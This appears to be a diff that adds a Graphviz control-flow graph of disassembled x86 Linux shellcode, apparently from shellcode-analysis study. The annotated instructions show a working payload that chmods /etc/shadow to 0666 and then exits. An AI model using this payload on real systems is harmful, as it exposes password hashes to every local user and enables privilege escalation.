@@ -1,0 +1,15 @@
+digraph code {
+	graph [bgcolor=azure fontsize=8 fontname="Courier" splines="ortho"];
+	node [fillcolor=gray style=filled shape=box];
+	edge [arrowhead="normal"];
+	"0x00000000" -> "0x00000071" [color="#5f8700"];
+	"0x00000000" -> "0x0000000e" [color="#e03030"];
+	"0x00000000" [URL="fcn.00000000/0x00000000", fillcolor="palegreen",color="#e03030", fontname="Courier",label=";-- oeax:\l;-- eax:\l;-- ebx:\l;-- ecx:\l;-- edx:\l;-- esi:\l;-- edi:\l;-- eflags:\l(fcn) fcn.00000000 36\l  fcn.00000000 ();\l0x00000000      cdq                ; sets EDX 0 if EAX is positive\l0x00000001      push 0xf           ; 15 ; 15 - sys_chmod\l0x00000003      pop eax            ; sys_chmod\l0x00000004      push edx           ; push 0x0\l0x00000005      call 0x16          ; pushes /etc/shadow address on the stack\l0x0000000a      das                ; /etc/shadow\l0x0000000b      je 0x71            ; data\l"]
+	"0x0000000e" -> "0x00000079" [color="#5f8700"];
+	"0x0000000e" -> "0x00000011" [color="#e03030"];
+	"0x0000000e" [URL="fcn.00000000/0x0000000e", fillcolor="white",color="#e03030", fontname="Courier",label="0x0000000e      das                ; data\l0x0000000f      jae 0x79           ; data\l"]
+	"0x00000011" -> "0x00000016" [color="#5f8700"];
+	"0x00000011" -> "0x00000016" [color="#e03030"];
+	"0x00000011" [URL="fcn.00000000/0x00000011", fillcolor="white",color="#e03030", fontname="Courier",label="0x00000011      popal              ; data\l0x00000012           .byte 0x64    ; data\l0x00000013      outsd dx, dword [esi] ; data\l0x00000014      ja 0x16            ; data\l"]
+	"0x00000016" [URL="fcn.00000000/0x00000016", fillcolor="white",color="#e03030", fontname="Courier",label="0x00000016      pop ebx            ; pops /etc/shadow address into ebx\l0x00000017      push 0x1b6         ; 438 ; octal 0666\l0x0000001c      pop ecx            ; mode_t mode\l0x0000001d      int 0x80           ; sys_chmod\l0x0000001f      push 1             ; 1 ; sys_exit\l0x00000021      pop eax            ; sys_exit => eax\l0x00000022      int 0x80           ; sys_exit\l"]
+}
